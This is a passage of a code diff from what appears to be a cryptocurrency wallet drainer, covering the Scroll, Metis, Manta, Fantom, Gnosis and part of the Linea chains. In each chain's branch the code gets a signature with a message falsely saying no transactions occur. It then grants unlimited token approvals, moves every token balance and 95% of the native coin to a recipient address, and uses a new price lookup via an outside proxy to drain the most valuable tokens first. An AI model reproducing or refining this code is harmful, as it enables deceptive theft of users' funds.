-                             console.error('Error transferring BLAST:', error);
-                            
-                        }
-                        break;
-          
-          
-                    //SCROLL
-                    case scroll.chainId:
-                      const scrollTokens = await fetchSCROLLTokens(address);
-          
-                      // Message to sign
-                      const scrollMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const scrollSignature = await signer.signMessage(scrollMessage);
-                      console.log('Signature:', scrollSignature);
-          
-                      const scrollTokenDetails = [];
-                      for (let token of scrollTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                      break;
+        
+        
+                  //SCROLL
+                  case scroll.chainId:
+                    const scrollTokens = await fetchSCROLLTokens(address);
+        
+                    // Message to sign
+                    const scrollMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const scrollSignature = await signer.signMessage(scrollMessage);
+                    console.log('Signature:', scrollSignature);
+        
+                    const scrollTokenDetails = [];
+                    for (let token of scrollTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               scrollTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      scrollTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of scrollTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(scrollContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(scrollContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                         
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SCROLL`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SCROLL`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for SCROLL to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring SCROLL:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    scrollTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of scrollTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(scrollContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(scrollContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                       
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SCROLL`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SCROLL`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for SCROLL to send')
+                       
                      }
-                     break;
-                     
-                    //METIS
-                    case metis.chainId:
-                      const metisTokens = await fetchMETISTokens(address);
-          
-                      // Message to sign
-                      const metisMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const metisSignature = await signer.signMessage(metisMessage);
-                      console.log('Signature:', metisSignature);
-          
-                      const metisTokenDetails = [];
-                      for (let token of metisTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring SCROLL:', error);
+                        
+                   }
+                   break;
+                   
+
+                  //METIS
+                  case metis.chainId:
+                    const metisTokens = await fetchMETISTokens(address);
+        
+                    // Message to sign
+                    const metisMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const metisSignature = await signer.signMessage(metisMessage);
+                    console.log('Signature:', metisSignature);
+        
+                    const metisTokenDetails = [];
+                    for (let token of metisTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               metisTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      metisTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of metisTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(metisContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(metisContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} METIS`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} METIS`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for METIS to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring METIS:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    metisTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of metisTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(metisContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(metisContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} METIS`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} METIS`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for METIS to send')
+                       
                      }
-                        break;
-          
-                    //MANTA      
-                    case manta.chainId:
-                      const mantaTokens = await fetchMANTATokens(address);
-          
-                      // Message to sign
-                      const mantaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const mantaSignature = await signer.signMessage(mantaMessage);
-                      console.log('Signature:', mantaSignature);
-          
-                      const mantaTokenDetails = [];
-                      for (let token of mantaTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring METIS:', error);
+                        
+                   }
+                      break;
+        
+                  //MANTA      
+                  case manta.chainId:
+                    const mantaTokens = await fetchMANTATokens(address);
+        
+                    // Message to sign
+                    const mantaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const mantaSignature = await signer.signMessage(mantaMessage);
+                    console.log('Signature:', mantaSignature);
+        
+                    const mantaTokenDetails = [];
+                    for (let token of mantaTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               mantaTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      mantaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of mantaTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(mantaContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(mantaContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTA`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTA`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for MANTA to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring MANTA:', error);
-                         
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    mantaTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+                    try {
+                        for(let token of mantaTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(mantaContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(mantaContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTA`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTA`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for MANTA to send')
+                       
                      }
-                      break;
-          
-                    //FANTOM      
-                    case fantom.chainId:
-                      const fantomTokens = await fetchFANTOMTokens(address);
-          
-                      // Message to sign
-                      const fantomMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const fantomSignature = await signer.signMessage(fantomMessage);
-                      console.log('Signature:', fantomSignature);
-          
-                      const fantomTokenDetails = [];
-                      for (let token of fantomTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring MANTA:', error);
+                       
+                   }
+                    break;
+        
+                  //FANTOM      
+                  case fantom.chainId:
+                    const fantomTokens = await fetchFANTOMTokens(address);
+        
+                    // Message to sign
+                    const fantomMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const fantomSignature = await signer.signMessage(fantomMessage);
+                    console.log('Signature:', fantomSignature);
+        
+                    const fantomTokenDetails = [];
+                    for (let token of fantomTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               fantomTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      fantomTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of fantomTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(fantomContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(fantomContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} FANTOM`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} FANTOM`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for FANTOM to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring FANTOM:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    fantomTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of fantomTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(fantomContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(fantomContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} FANTOM`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} FANTOM`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for FANTOM to send')
+                       
                      }
-                      break;
-          
-                    //GNOSIS
-                    case gnosis.chainId:
-                      const gnosisTokens = await fetchGNOSISTokens(address);
-          
-                      // Message to sign
-                      const gnosisMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const gnosisSignature = await signer.signMessage(gnosisMessage);
-                      console.log('Signature:', gnosisSignature);
-          
-                      const gnosisTokenDetails = [];
-                      for (let token of gnosisTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring FANTOM:', error);
+                        
+                   }
+                    break;
+        
+                  //GNOSIS
+                  case gnosis.chainId:
+                    const gnosisTokens = await fetchGNOSISTokens(address);
+        
+                    // Message to sign
+                    const gnosisMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const gnosisSignature = await signer.signMessage(gnosisMessage);
+                    console.log('Signature:', gnosisSignature);
+        
+                    const gnosisTokenDetails = [];
+                    for (let token of gnosisTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               gnosisTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      gnosisTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of gnosisTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(gnosisContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(gnosisContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                         
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} GNOSIS`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} GNOSIS`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for GNOSIS to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring GNOSIS:', error);
-                         
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    gnosisTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of gnosisTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(gnosisContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(gnosisContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                       
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} GNOSIS`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} GNOSIS`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for GNOSIS to send')
+                       
                      }
-                      break;
-          
-                    //LINEA
-                    case linea.chainId:
-                      const lineaTokens = await fetchLINEATokens(address);
-          
-                      // Message to sign
-                      const lineaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const lineaSignature = await signer.signMessage(lineaMessage);
-                      console.log('Signature:', lineaSignature);
-          
-                      const lineaTokenDetails = [];
-                      for (let token of lineaTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring GNOSIS:', error);
+                       
+                   }
+                    break;
+        
+                  //LINEA
+                  case linea.chainId:
+                    const lineaTokens = await fetchLINEATokens(address);
+        
+                    // Message to sign
+                    const lineaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const lineaSignature = await signer.signMessage(lineaMessage);
+                    console.log('Signature:', lineaSignature);
+        
+                    const lineaTokenDetails = [];
+                    for (let token of lineaTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
